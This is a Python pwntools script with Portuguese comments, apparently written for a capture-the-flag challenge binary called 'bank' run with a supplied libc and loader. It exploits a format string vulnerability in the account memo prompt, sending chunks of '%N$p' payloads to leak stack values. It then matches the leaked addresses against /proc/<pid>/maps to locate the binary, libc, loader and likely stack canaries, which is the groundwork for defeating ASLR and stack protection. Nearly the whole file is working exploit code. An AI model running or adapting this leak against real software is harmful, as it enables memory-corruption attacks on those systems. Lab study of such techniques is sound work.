#!/usr/bin/env python3
from pwn import *
import re

context.log_level = "error"

BIN = "./bank"
LD = "./ld-linux-x86-64.so.2"
LIBC_DIR = "."

def start_process():
    """
    Executa o binário usando o loader e a libc fornecidos.
    """
    return process([LD, "--library-path", LIBC_DIR, BIN])

def read_maps(pid):
    """
    Lê /proc/<pid>/maps depois que o programa já chegou no menu.
    Assim garantimos que bank, libc e ld-linux já foram mapeados.
    """
    maps = []

    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            parts = line.split()
            addr_range = parts[0]
            path = parts[-1] if len(parts) >= 6 else ""

            start_s, end_s = addr_range.split("-")
            start = int(start_s, 16)
            end = int(end_s, 16)

            maps.append((start, end, path, line))

    return maps

def classify(value, maps):
    """
    Classifica um endereço vazado comparando com os mappings reais do processo.
    """
    for start, end, path, line in maps:
        if start <= value < end:
            return path, value - start, line

    return None, None, None

def leak_chunk(p, start, end):
    """
    Envia uma rodada de format string.

    Importante:
    Esta função assume que o prompt '> ' já foi consumido.
    Então ela manda diretamente a opção 1.
    No final, ela lê até o próximo prompt e deixa o processo pronto
    para a próxima rodada.
    """
    p.sendline(b"1")
    p.recvuntil(b"Enter account memo: ")

    payload = b"|".join([f"%{i}$p".encode() for i in range(start, end + 1)])
    p.sendline(payload)

    data = p.recvuntil(b"> ", timeout=2)
    text = data.decode(errors="replace")

    marker = "Account Holder: "
    if marker not in text:
        print("[!] Não encontrei Account Holder nessa resposta.")
        print(text)
        return {}

    leaked_line = text.split(marker, 1)[1].split("\n", 1)[0]
    values = leaked_line.split("|")

    result = {}

    for index, raw in zip(range(start, end + 1), values):
        raw = raw.strip()

        if raw == "(nil)":
            result[index] = None
            continue

        try:
            result[index] = int(raw, 16)
        except ValueError:
            result[index] = None

    return result

def main():
    p = start_process()

    # Espera o programa terminar de inicializar e chegar ao menu.
    p.recvuntil(b"> ")

    maps = read_maps(p.pid)

    print("=" * 100)
    print("MAPS RELEVANTES")
    print("=" * 100)

    for _, _, path, line in maps:
        if "bank" in path or "libc.so.6" in path or "ld-linux" in path or "[stack]" in path:
            print(line)

    print()
    print("=" * 100)
    print("LEAKS CLASSIFICADOS")
    print("=" * 100)

    all_leaks = {}

    # Vaza em blocos para respeitar o limite de 127 bytes do memo.
    for start in range(1, 91, 8):
        end = start + 7
        leaks = leak_chunk(p, start, end)
        all_leaks.update(leaks)

    for index in sorted(all_leaks):
        value = all_leaks[index]

        if value is None:
            print(f"%{index:02d}$p = (nil)")
            continue

        path, offset, line = classify(value, maps)

        canary_like = ""
        if value != 0 and (value & 0xff) == 0:
            canary_like = "  <-- termina com 00, candidato a canary"

        if path:
            print(f"%{index:02d}$p = {value:#018x}  {path} + {offset:#x}{canary_like}")
        else:
            print(f"%{index:02d}$p = {value:#018x}{canary_like}")

    p.close()

if __name__ == "__main__":
    main()
